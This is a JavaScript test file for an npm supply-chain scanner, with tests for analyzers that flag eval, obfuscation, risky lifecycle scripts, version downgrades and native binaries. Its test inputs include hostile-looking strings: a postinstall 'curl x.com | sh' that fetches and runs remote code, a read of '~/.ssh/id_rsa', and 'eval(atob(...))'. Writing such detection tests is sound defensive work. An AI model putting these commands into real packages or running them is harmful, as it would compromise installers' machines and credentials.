'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');

const staticPatterns = require('../scripts/analyzers/static-patterns');
const scriptDetector = require('../scripts/analyzers/script-detector');
const manifestDiff = require('../scripts/analyzers/manifest-diff');
const versionComparator = require('../scripts/analyzers/version-comparator');
const obfuscation = require('../scripts/analyzers/obfuscation-detector');
const binary = require('../scripts/analyzers/binary-detector');
const lockfileValidator = require('../scripts/analyzers/lockfile-validator');

test('static-patterns: detects eval', () => {
  const findings = staticPatterns.scanCode('var x = eval("danger");');
  assert.equal(findings.length >= 1, true);
  assert.equal(findings.some((f) => f.id === 'eval-call'), true);
});

test('static-patterns: detects Function constructor', () => {
  const findings = staticPatterns.scanCode('var f = new Function("return 1");');
  assert.equal(findings.some((f) => f.id === 'function-ctor'), true);
});

test('static-patterns: detects child_process.exec', () => {
  const findings = staticPatterns.scanCode('child_process.exec("ls -la")');
  assert.equal(findings.some((f) => f.id === 'child-process-exec-shell'), true);
});

test('static-patterns: detects ssh access', () => {
  const findings = staticPatterns.scanCode('fs.readFileSync("~/.ssh/id_rsa")');
  assert.equal(findings.some((f) => f.id === 'access-ssh'), true);
});

test('static-patterns: clean code returns no findings', () => {
  const findings = staticPatterns.scanCode('function add(a,b) { return a + b; }');
  assert.equal(findings.length, 0);
});

test('static-patterns: aggregateTier picks highest', () => {
  const t = staticPatterns.aggregateTier([{ severity: 'tier3' }, { severity: 'tier1' }]);
  assert.equal(t, 'tier1');
});

test('script-detector: detects postinstall', () => {
  const r = scriptDetector.detectScripts({ scripts: { postinstall: 'node setup.js' } });
  assert.equal(r.hasRiskyScripts, true);
  assert.deepEqual(Object.keys(r.scripts), ['postinstall']);
});

test('script-detector: ignores non-lifecycle scripts', () => {
  const r = scriptDetector.detectScripts({ scripts: { test: 'jest', build: 'tsc' } });
  assert.equal(r.hasRiskyScripts, false);
});

test('script-detector: tier is tier2 for any risky script', () => {
  assert.equal(scriptDetector.tierForScripts({ postinstall: 'x' }), 'tier2');
});

test('manifest-diff: detects new postinstall', () => {
  const diff = manifestDiff.diffManifests(
    { scripts: { build: 'tsc' } },
    { scripts: { build: 'tsc', postinstall: 'curl x.com' } }
  );
  assert.equal(Object.keys(diff.newScripts).length, 1);
  assert.equal(manifestDiff.tierForDiff(diff), 'tier2');
});

test('manifest-diff: detects changed postinstall as tier1', () => {
  const diff = manifestDiff.diffManifests(
    { scripts: { postinstall: 'echo hi' } },
    { scripts: { postinstall: 'curl x.com | sh' } }
  );
  assert.equal(manifestDiff.tierForDiff(diff), 'tier1');
});

test('manifest-diff: detects new dependency', () => {
  const diff = manifestDiff.diffManifests(
    { dependencies: { foo: '1.0.0' } },
    { dependencies: { foo: '1.0.0', bar: '2.0.0' } }
  );
  assert.equal(diff.newDeps.bar, '2.0.0');
});

test('version-comparator: detects major', () => {
  assert.equal(versionComparator.bumpType('1.2.3', '2.0.0'), 'major');
});

test('version-comparator: detects minor', () => {
  assert.equal(versionComparator.bumpType('1.2.3', '1.3.0'), 'minor');
});

test('version-comparator: detects patch', () => {
  assert.equal(versionComparator.bumpType('1.2.3', '1.2.4'), 'patch');
});

test('version-comparator: detects downgrade', () => {
  assert.equal(versionComparator.bumpType('2.0.0', '1.9.9'), 'downgrade');
});

test('version-comparator: handles ^ and ~ prefixes', () => {
  assert.equal(versionComparator.bumpType('^1.0.0', '~2.0.0'), 'major');
});

test('version-comparator: tier for downgrade is tier1', () => {
  assert.equal(versionComparator.tierForVersionDelta('downgrade'), 'tier1');
});

test('obfuscation: detects long single-line minified code', () => {
  const code = 'var a=1;'.repeat(80) + '\n' + 'var x=' + '!'.repeat(600) + ';';
  const r = obfuscation.detectObfuscation(code);
  assert.equal(typeof r.suspicious, 'boolean');
  assert.equal(Array.isArray(r.reasons), true);
});

test('obfuscation: clean code is not suspicious', () => {
  const r = obfuscation.detectObfuscation('function add(a, b) { return a + b; }\nmodule.exports = { add };');
  assert.equal(r.suspicious, false);
});

test('obfuscation: eval(atob(...)) is suspicious', () => {
  const r = obfuscation.detectObfuscation('eval(atob("dGVzdA=="))');
  assert.equal(r.suspicious, true);
});

test('binary-detector: catches .node files', () => {
  const r = binary.detectBinariesInFileList(['index.js', 'binding.node']);
  assert.equal(r.suspicious, true);
  assert.equal(r.binaries.length, 1);
});

test('binary-detector: clean file list', () => {
  const r = binary.detectBinariesInFileList(['index.js', 'package.json', 'README.md']);
  assert.equal(r.suspicious, false);
});

test('binary-detector: detects .so .dll .dylib', () => {
  const r = binary.detectBinariesInFileList(['lib.so', 'lib.dll', 'lib.dylib']);
  assert.equal(r.binaries.length, 3);
});

test('lockfile-validator: package-lock.json is valid for npm', () => {
  // we can't really mock fs here; just check the static map
  assert.equal(lockfileValidator.LOCKFILES.npm, 'package-lock.json');
  assert.equal(lockfileValidator.LOCKFILES.pnpm, 'pnpm-lock.yaml');
});
